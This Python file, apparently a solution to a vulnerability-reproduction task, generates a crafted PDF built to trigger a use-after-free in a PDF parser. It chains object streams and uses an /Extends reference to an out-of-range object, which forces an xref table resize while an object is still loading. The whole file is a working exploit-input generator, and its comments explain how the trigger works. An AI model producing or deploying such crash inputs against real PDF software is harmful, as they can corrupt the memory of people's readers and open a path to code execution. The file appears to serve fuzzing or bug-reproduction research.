import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        def p16(x): return struct.pack('>H', x)
        
        header = b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n"
        
        # Structure:
        # Obj 1 (ObjStm) -> Contains Obj 5 (Page)
        # Obj 1 depends on Obj 2 (via DecodeParms)
        # Obj 2 (Dummy) -> Contained in Obj 3 (ObjStm)
        # Obj 3 (ObjStm) -> Extends Obj 100 (which is out of bounds)
        # Accessing Obj 100 during load of Obj 3 triggers xref table resize (Use-After-Free)
        
        # Obj 5 content: Page object inside Obj 1
        # "5 0 " is 4 bytes. /First 4 points to start of dict.
        obj5_inner = b"5 0 << /Type /Page /Parent 7 0 R >>"
        obj1_stm_body = obj5_inner
        obj1_compressed = zlib.compress(obj1_stm_body)
        
        obj1_data = (
            f"1 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Filter /FlateDecode /DecodeParms 2 0 R /Length {len(obj1_compressed)} >>\n"
            "stream\n"
        ).encode() + obj1_compressed + b"\nendstream\nendobj\n"
        
        # Obj 2 content inside Obj 3
        # "2 0 " is 4 bytes.
        obj2_inner = b"2 0 << >>"
        obj3_stm_body = obj2_inner
        
        # Obj 3: /Extends 100 0 R triggers the vulnerability
        # 100 is > Size (8), causing xref resize
        obj3_data = (
            f"3 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Extends 100 0 R /Length {len(obj3_stm_body)} >>\n"
            "stream\n"
        ).encode() + obj3_stm_body + b"\nendstream\nendobj\n"
        
        # Standard Catalog and Pages
        obj6_data = b"6 0 obj\n<< /Type /Catalog /Pages 7 0 R >>\nendobj\n"
        obj7_data = b"7 0 obj\n<< /Type /Pages /Kids [5 0 R] /Count 1 >>\nendobj\n"
        
        # Obj 100: Present in file but not in XRef, to encourage scan/repair
        obj100_data = b"100 0 obj\n<< >>\nendobj\n"
        
        # Calculate offsets
        offset = len(header)
        off_obj1 = offset
        offset += len(obj1_data)
        off_obj3 = offset
        offset += len(obj3_data)
        off_obj6 = offset
        offset += len(obj6_data)
        off_obj7 = offset
        offset += len(obj7_data)
        off_obj100 = offset
        offset += len(obj100_data)
        off_obj4 = offset
        
        # XRef Stream (Obj 4)
        # Maps objects 0..7
        rows = []
        rows.append(b'\x00\x00\x00\x00') # 0: Free
        rows.append(b'\x01' + p16(off_obj1) + b'\x00') # 1: Obj 1
        rows.append(b'\x02' + p16(3) + b'\x00')        # 2: In ObjStm 3, Index 0
        rows.append(b'\x01' + p16(off_obj3) + b'\x00') # 3: Obj 3
        rows.append(b'\x01' + p16(off_obj4) + b'\x00') # 4: Obj 4 (XRef)
        rows.append(b'\x02' + p16(1) + b'\x00')        # 5: In ObjStm 1, Index 0
        rows.append(b'\x01' + p16(off_obj6) + b'\x00') # 6: Obj 6
        rows.append(b'\x01' + p16(off_obj7) + b'\x00') # 7: Obj 7
        
        xref_data = b"".join(rows)
        
        obj4_start = f"4 0 obj\n<< /Type /XRef /Size 8 /Root 6 0 R /W [1 2 1] /Length {len(xref_data)} >>\nstream\n".encode()
        obj4_end = b"\nendstream\nendobj\n"
        obj4_full = obj4_start + xref_data + obj4_end
        
        body = header + obj1_data + obj3_data + obj6_data + obj7_data + obj100_data + obj4_full
        trailer = b"startxref\n" + str(off_obj4).encode() + b"\n%%EOF\n"
        
        return body + trailer